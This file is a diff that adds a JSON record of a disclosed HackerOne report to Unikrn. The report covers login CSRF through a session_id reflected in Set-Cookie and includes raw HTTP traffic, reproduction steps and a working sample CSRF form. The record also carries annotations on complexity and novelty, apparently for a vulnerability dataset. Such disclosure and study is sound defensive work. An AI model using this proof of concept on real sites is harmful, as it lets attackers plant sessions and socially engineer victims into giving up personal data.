@@ -1,0 +1,50 @@
+{
+    "reported_to": "Unikrn",
+    "reported_by": "tolo7010 ",
+    "title": "CSRF log victim into the attacker account",
+    "content": "\nAll the API endpoints (v1 & v2) reflect session_id to Set-Cookie response - which can lead victim to login attacker account, for example:\nRequest:\nCode 487 Bytes\n1POST /apiv1/ HTTP/1.1\n2Host: unikrn.com\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\n4Accept: application/json, text/plain, */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://unikrn.com/games/lol/afreeca-freecs-v-griffin---best-of-3/31638\n8Content-Type: application/json\n9Application-Version: v3.9.1-1485-g57625f1\n10Content-Length: 49\n11Cookie: ...\n12Connection: close\n13\n14{\"session_id\":\"ue9cpp0t2mitjpm0s45epj78l3kpig6j\"}\nResponse:\nCode 860 Bytes\n1HTTP/1.1 202 Accepted\n2Date: Sun, 26 Nov 2017 07:28:38 GMT\n3Content-Type: application/json\n4Content-Length: 148\n5Connection: close\n6Access-Control-Allow-Origin: *\n7Access-Control-Max-Age: 86400\n8Cache-Control: no-store, no-cache, must-revalidate\n9CI: M-production C-1 V-1.2.0\n10Content-Security-Policy: default-src 'none'; frame-ancestors 'none'\n11Expires: Thu, 19 Nov 1981 08:52:00 GMT\n12Pragma: no-cache\n13Set-Cookie: CW=ue9cpp0t2mitjpm0s45epj78l3kpig6j; expires=Wed, 06-Dec-2017 07:28:37 GMT; Max-Age=864000; path=/; domain=unikrn.com; secure; HttpOnly\n14Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n15Vary: Origin\n16X-XSS-Protection: 1; mode=block\n17Server: cloudflare-nginx\n18CF-RAY: 3c3b21cc1fb03415-HKG\n19\n20{\"success\": false, \"error\": true, \"msg\": \"missing_parameter_apiv1\", \"msg_trans\": \"missing_parameter_apiv1\", \"code\": 666, \"flds\": null, \"data\": null}\nSteps to reproduce:\nCode 204 Bytes\n11. The victim has logged out the site by himself or by (out of scope) logout-CSRF. \n22. Attacker log into his account and get his session id (CW=) to craft CSRF page.\n33. Lead the victim to visit CSRF page.\nSample CSRF Page\nCode 274 Bytes\n1<!doctype html>\n2<html>\n3<head>\n4</head> \n5<body>\n6<form action=\"https://unikrn.com/apiv1/\" method=\"POST\">\n7<input type=\"hidden\" name=\"session_id\" id=\"session_id\" value=\"cm8csktf7p485hmb7on32o5bm94nm71i\"> <!-- attacker session_id -->\n8<input type=\"submit\"\">\n9</form>\n10</body>\n11</html>\nNote this sample CSRF assumes the user has logged out from the site, and make sure you replace attacker session_id of your current logged in account to reproduce, then goto unikrn.com after visiting the CSRF-page. However a script can be created here to automated these tasks.\nImpact\nLog any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1523341200,
+    "report_url": "https://hackerone.com/reports/293016",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "The victim has logged out of the site, either manually or via a logout-CSRF attack."
+        ],
+        [
+            2,
+            "The attacker logs into their account, obtains their session ID (CW=), and crafts a CSRF page with this session ID."
+        ],
+        [
+            3,
+            "The victim is tricked into visiting the CSRF page, which submits the attacker's session ID to the API endpoint."
+        ],
+        [
+            4,
+            "The victim's browser processes the response, setting the attacker's session ID in the victim's cookies."
+        ],
+        [
+            5,
+            "The victim is now logged into the attacker's account when they visit the site."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to force a victim into logging into the attacker's account via CSRF. This is possible because the API endpoints reflect the session_id in the Set-Cookie header of the response, which can be manipulated by the attacker to set their own session ID in the victim's browser.",
+    "reason": "The attack involves understanding CSRF and session handling, but the steps are straightforward once the session reflection is identified. The interaction between the CSRF page and the API endpoint is not overly complex or novel.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
